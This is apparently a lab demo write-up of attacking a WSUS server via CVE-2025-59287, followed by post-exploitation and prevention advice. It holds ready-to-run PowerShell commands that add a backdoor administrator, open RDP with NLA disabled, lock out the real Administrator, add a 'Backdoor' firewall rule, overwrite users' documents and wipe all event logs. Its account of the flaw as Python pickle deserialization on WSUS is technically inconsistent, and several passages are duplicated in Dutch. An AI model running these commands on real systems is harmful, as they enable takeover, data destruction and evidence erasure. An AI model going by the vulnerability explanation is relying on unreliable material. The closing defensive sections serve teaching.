# Demo Insights

## Anatomy of the Attack

The core of the problem is that the WSUS endpoint (the listening server) trusts that the data it receives is "safe", while the attacker manipulates the structure of that data to execute their own commands.

### 1. The Entry Point: SOAP & API Endpoints

WSUS communicates by default via XML-based protocols (SOAP). When the Kali machine connects to port 8530 (HTTP) or 8531 (HTTPS), it targets specific web services intended for client communication or synchronization.
The vulnerability arises when one of these endpoints expects a serialized object to process the status of an update or a client configuration.

### 2. The Mechanism: What is "Pickle" Deserialization?

In Python, the `pickle` module is used to convert objects into a byte stream (serialization) and back again (deserialization).
The problem lies in the `__reduce__` method in Python's Pickle.

The exploit: When the WSUS service "unpickles" the prepared data, it executes the instructions defined in the `__reduce__` function. Instead of reconstructing a legitimate object, you force the server to execute a system command via, for example, `os.system()` or `subprocess.Popen()`.

### 3. Payload Delivery

The Python script sends a POST request to the WSUS service. This request contains the malicious byte stream packaged in the body of the HTTP message.
Because the WSUS service believes this is a legitimate interaction from a "Downstream Server" or a "Client Computer", it extracts the data to process it.

### 4. Privilege Escalation (Impact)

This is where it becomes critical. Because the WSUS service (often running under `NT AUTHORITY\NETWORK SERVICE` or even `SYSTEM`) processes the data,
the code is executed with the same privileges as the service.

Scenario: If you inject a reverse shell, the Kali machine receives a connection back, giving you immediate full control over the Windows Server, without needing a password.

**Scenario:** Als je een reverse shell injecteert, krijgt de Kali-machine een verbinding terug waarbij je direct volledige controle hebt over de Windows Server,<br> zonder dat je een wachtwoord nodig hebt.

---

| **Phase**      | **Attacker Action (Kali)**                           | **Target Reaction (WSUS)**                               |
| -------------- | ---------------------------------------------------- | -------------------------------------------------------- |
| **Trigger**    | Sends manipulated `pickle` payload via HTTP POST     | Receives the data on port 8530                           |
| **Processing** | Waits for execution of the `__reduce__` instruction  | Starts the deserialization process of the object         |
| **Execution**  | Listens (e.g., via `nc -lvnp`) for an incoming shell | Executes the malicious code (e.g., `whoami > proof.txt`) |
| **Access**     | Confirms RCE (Remote Code Execution)                 | The service remains running, but is now compromised      |

### 5. Why does this work on Windows Server 2022?

Although Windows Server 2022 is modern, WSUS relies on legacy architectures and APIs that sometimes still deserialize objects in an insecure manner. CVE-2025-59287 exploits the fact that incoming object validation is not strict enough before loading them into memory.
In a real scenario test, it is crucial to check whether Windows Defender settings or EDR (Endpoint Detection & Response) block the execution of unusual subprocesses by `wsusservice.exe`.

## 1. Post-Exploitation

### 1.1 Persistence: Creating a custom user

#### 1.1.1 Insight

This creates a "legitimate" entry point. Even if the vulnerable Python script is removed, we can now log in as an administrator via RDP (Remote Desktop).

#### 1.1.2 Enabling RDP via the Shell

**1.** Create a new user and password

```powershell
net user Pawny HappyHacking! /add
net localgroup Administrators Pawny /add
```

**2.** Enable RDP in the registry

```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
```

**3.** Allow RDP through Windows Firewall

```powershell
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

**4.** Lower security so Kali can connect more easily (disable NLA)

```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
```

### 1.2 Sabotage: Changing the Administrator password

#### 1.2.1 Insight

De echte systeembeheerder kan niet meer inloggen op zijn eigen server.<br>
De organisatie is de controle over hun eigen infrastructuur volledig kwijt.

#### 1.2.2 Command

```powershell
net user Administrator YouGotPawned!
```

### 1.3 Disabling Defenses: Firewall manipulation

#### 1.3.1 Insight

We can not only disable the firewall, but actually turn it against the administrator by closing ports or opening them specifically for our tools.

#### 1.3.2 Command

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
# Maar open specifiek een poort voor onze malware:
New-NetFirewallRule -DisplayName "Backdoor" -Direction Inbound -Protocol TCP -LocalPort 443 -Action Allow
```

### 1.4 Ransomware Simulation (Destroying the File System)

#### 1.4.1 Insight

Instead of stealing files, we can render them unusable. An attacker can encrypt or simply overwrite all documents on the server. This simulates the impact of ransomware. It shows that data integrity can be lost within seconds.

#### 1.4.2 Command (overwriting all .docx files)

```powershell
Get-ChildItem -Path C:\Users -Include *.docx,*.pdf -Recurse | ForEach-Object { "GEHACKT" | Out-File $_.FullName }
```

### 1.5 Cover Tracks (Anti-Forensics)

#### 1.5.1 Insight

A clever attacker ensures the IT department cannot see what happened afterward. This makes recovery and investigation nearly impossible. The administrator knows something is wrong, but cannot determine how or when it happened. This is potentially the final step of a hacker before logging off.

#### 1.5.2 Command (clearing all Windows Event Logs)

```powershell
Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }
```

## Potential Damage & Recovery

- **Damage:** The damage is not only technical (data loss), but also operational. If this is a WSUS server (as in our lab), the attacker can push fake updates to all computers in the organization. This turns it into a "Supply Chain Attack" within the internal network.

- **Recovery:** How easily does a team recover? Very difficult. Because the attacker had administrator privileges, a backdoor could exist anywhere in the system (in the registry, in scheduled tasks, in the kernel, ...). The only safe way to recover is to completely wipe the server and reinstall from a trusted backup from before the breach.

- **Impact:** An attacker with RDP access can use graphical applications that are difficult to operate via a terminal (such as web browsers to download malware, or database management GUIs).

- **Persistence:** Even if the IT administrator finds and stops the vulnerable Python server, our backdoor account remains and the RDP port stays open. We have "legitimized" our access.

- **Business Continuity:** f you deprive the Administrator of their password (as we did earlier) and clear logs, the organization may need to physically pull the plug on servers for days to halt the attack. Labor costs for employees unable to work are often many times higher than the technical recovery costs.

- **The role of EDR (Endpoint Detection and Response):** Note that modern systems such as CrowdStrike or Microsoft Defender for Endpoint would immediately flag this type of PowerShell behavior (like `Clear-EventLog`). The fact that our attack succeeds suggests that the organization's security monitoring has failed.

## Minimizing Impact & Prevention

- **Least Privilege Principle:** Why is that Python/WSUS service running as Administrator? If the service ran under a Service Account with limited privileges, the attack could never have modified the firewall or created new users.

- **Network Segmentation:** The server should not be able to communicate directly with the internet. An Egress Firewall Rule blocking outbound connections (like our reverse shell to Kali) would have stopped the attack, even if the exploit succeeded.

- **Safe Deserialization:** Safe Deserialization: Instead of `pickle` (which is inherently insecure), developers should use secure formats such as JSON. JSON is pure data and contains no executable code instructions.

- **RDP beperken:** RDP should never be directly accessible from another network. Use a Jump Server or VPN.

- **RDP Logging:** Set up an alert whenever a new RDP session is initiated, especially from a newly created account.

- **MFA (Multi-Factor Authentication):** Even if the attacker creates an account, they would not be able to log in via RDP without the administrator's mobile phone.
